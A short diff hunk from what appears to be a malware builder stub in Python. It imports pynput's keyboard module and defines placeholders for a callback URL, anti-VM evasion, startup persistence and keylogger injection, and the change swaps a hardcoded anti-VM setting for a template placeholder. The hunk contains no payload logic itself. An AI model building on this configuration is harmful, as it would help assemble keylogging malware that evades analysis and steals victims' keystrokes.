@@ -7,7 +7,7 @@ from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
 UrLxD = '%REPLACE_ME_FOR_QUİCADXD%'
-Anti_Vm = "false"
+Anti_Vm = "%AnTiVm%"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
 injectKeylogger = "%keyloggerinject???%"
